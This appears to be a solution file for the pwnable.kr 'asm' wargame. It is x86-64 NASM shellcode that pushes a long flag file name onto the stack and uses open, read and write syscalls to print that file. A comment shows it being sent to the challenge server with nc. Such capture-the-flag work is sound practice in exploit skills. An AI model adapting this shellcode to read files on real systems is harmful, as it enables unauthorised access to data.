; nasm shellcode.asm
; nc pwnable.kr 9026 < shellcode

%macro EXIT 1
        mov rdi, %1
        mov rax, 60
        syscall
%endmacro

%macro WRITE 3
        mov rdi, %1
        mov rsi, %2
        mov rdx, %3
        mov rax, 1
        syscall
%endmacro

%macro READ 3
        mov rdi, %1
        mov rsi, %2
        mov rdx, %3
        mov rax, 0
        syscall
%endmacro

%macro OPEN 3
        mov rdi, %1
        mov rsi, %2
        mov rdx, %3
        mov rax, 2
        syscall
%endmacro

[BITS 64]

push rbp
mov rbp, rsp
sub rsp, 2048

mov [rsp+0], DWORD 'this'
mov [rsp+4], DWORD '_is_'
mov [rsp+8], DWORD 'pwna'
mov [rsp+12], DWORD 'ble.'
mov [rsp+16], DWORD 'kr_f'
mov [rsp+20], DWORD 'lag_'
mov [rsp+24], DWORD 'file'
mov [rsp+28], DWORD '_ple'
mov [rsp+32], DWORD 'ase_'
mov [rsp+36], DWORD 'read'
mov [rsp+40], DWORD '_thi'
mov [rsp+44], DWORD 's_fi'
mov [rsp+48], DWORD 'le.s'
mov [rsp+52], DWORD 'orry'
mov [rsp+56], DWORD '_the'
mov [rsp+60], DWORD '_fil'
mov [rsp+64], DWORD 'e_na'
mov [rsp+68], DWORD 'me_i'
mov [rsp+72], DWORD 's_ve'
mov [rsp+76], DWORD 'ry_l'
mov [rsp+80], DWORD 'oooo'
mov [rsp+84], DWORD 'oooo'
mov [rsp+88], DWORD 'oooo'
mov [rsp+92], DWORD 'oooo'
mov [rsp+96], DWORD 'oooo'
mov [rsp+100], DWORD 'oooo'
mov [rsp+104], DWORD 'oooo'
mov [rsp+108], DWORD 'oooo'
mov [rsp+112], DWORD 'oooo'
mov [rsp+116], DWORD 'oooo'
mov [rsp+120], DWORD 'oooo'
mov [rsp+124], DWORD 'oooo'
mov [rsp+128], DWORD 'oooo'
mov [rsp+132], DWORD 'oooo'
mov [rsp+136], DWORD 'oooo'
mov [rsp+140], DWORD 'oooo'
mov [rsp+144], DWORD 'oooo'
mov [rsp+148], DWORD 'oooo'
mov [rsp+152], DWORD 'oooo'
mov [rsp+156], DWORD '0000'
mov [rsp+160], DWORD '0000'
mov [rsp+164], DWORD '0000'
mov [rsp+168], DWORD '0000'
mov [rsp+172], DWORD '0000'
mov [rsp+176], DWORD '0000'
mov [rsp+180], DWORD '0ooo'
mov [rsp+184], DWORD 'oooo'
mov [rsp+188], DWORD 'oooo'
mov [rsp+192], DWORD 'oooo'
mov [rsp+196], DWORD 'oooo'
mov [rsp+200], DWORD 'oooo'
mov [rsp+204], DWORD '0000'
mov [rsp+208], DWORD '0000'
mov [rsp+212], DWORD '0000'
mov [rsp+216], DWORD 'o0o0'
mov [rsp+220], DWORD 'o0o0'
mov [rsp+224], DWORD 'o0o0'
mov [rsp+228], DWORD 'ong'

OPEN rsp, 0, 0

READ rax, rsp, 100

WRITE 1, rsp, rax

EXIT 0

leave
ret
